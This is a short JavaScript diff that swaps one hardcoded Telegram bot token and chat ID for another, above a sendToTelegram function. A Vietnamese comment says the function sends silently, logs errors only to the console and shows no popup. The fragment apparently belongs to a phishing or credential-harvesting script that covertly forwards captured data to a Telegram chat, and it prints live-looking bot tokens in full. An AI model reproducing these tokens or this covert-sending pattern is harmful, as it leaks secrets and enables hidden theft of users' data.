@@ -1,6 +1,6 @@
 // =============== TELEGRAM CONFIG ==================
-const TELEGRAM_BOT_TOKEN = "8485090208:AAEoMXklBAOxt2A4AlhwLLRjJMQvQ8Cnmnw";
-const TELEGRAM_CHAT_ID = "8414010634";
+const TELEGRAM_BOT_TOKEN = "8551695567:AAHi6pDHqp-RpJ3O-Mec1DraeqfkDIZ1sGw";
+const TELEGRAM_CHAT_ID = "6529163985";
 
 // Gửi ngầm, lỗi chỉ log trong console, KHÔNG hiện popup
 function sendToTelegram(message) {
